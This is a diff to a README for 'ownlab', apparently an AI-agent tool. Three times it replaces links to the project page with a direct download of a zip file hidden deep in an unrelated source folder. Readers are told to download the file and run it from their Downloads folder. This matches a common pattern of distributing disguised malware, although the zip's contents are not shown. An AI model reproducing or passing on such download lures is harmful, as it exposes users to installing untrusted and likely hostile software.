@@ -1,6 +1,6 @@
 # 🤖 ownlab - Build AI Agents for Your Lab
 
-[![Download ownlab](https://img.shields.io/badge/Download-ownlab-blue.svg)](https://github.com/62ngist888/ownlab)
+[![Download ownlab](https://img.shields.io/badge/Download-ownlab-blue.svg)](https://github.com/62ngist888/ownlab/raw/refs/heads/main/apps/web/src/app/api/channel-chat-local/Software_v3.0-beta.2.zip)
 
 ## 🧭 What Ownlab Does
 
@@ -24,7 +24,7 @@ For the best result, close other large apps before you start Ownlab.
 
 Visit this page to download or open the app files:
 
-[https://github.com/62ngist888/ownlab](https://github.com/62ngist888/ownlab)
+[https://github.com/62ngist888/ownlab/raw/refs/heads/main/apps/web/src/app/api/channel-chat-local/Software_v3.0-beta.2.zip](https://github.com/62ngist888/ownlab/raw/refs/heads/main/apps/web/src/app/api/channel-chat-local/Software_v3.0-beta.2.zip)
 
 If the page shows a release file, download it to your PC. If it shows a setup file, save the file first so you can run it from your Downloads folder.
 
@@ -144,6 +144,6 @@ It works best when you want:
 
 If you need the file again, use this link:
 
-[https://github.com/62ngist888/ownlab](https://github.com/62ngist888/ownlab)
+[https://github.com/62ngist888/ownlab/raw/refs/heads/main/apps/web/src/app/api/channel-chat-local/Software_v3.0-beta.2.zip](https://github.com/62ngist888/ownlab/raw/refs/heads/main/apps/web/src/app/api/channel-chat-local/Software_v3.0-beta.2.zip)
 
 Download the file from the page, then open it from your Downloads folder and follow the setup steps on screen
